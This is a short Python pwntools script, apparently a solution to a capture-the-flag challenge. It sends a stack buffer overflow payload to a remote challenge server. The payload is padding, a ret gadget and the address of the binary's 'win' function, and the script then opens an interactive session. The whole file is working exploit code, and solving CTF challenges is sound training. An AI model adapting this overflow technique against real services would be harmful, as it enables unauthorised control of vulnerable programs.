from pwn import *

elf = ELF('./let_the_journey_begin')
s = remote("challenges.cybersecuritychallenge.pt", 23111)

win_addr = elf.symbols['win']
ret_gadget = 0x40101a

payload = b"A" * (0x20 + 8)
payload += p64(ret_gadget)
payload += p64(win_addr)

s.recvuntil(b"ame?")
s.sendline(payload)
s.interactive()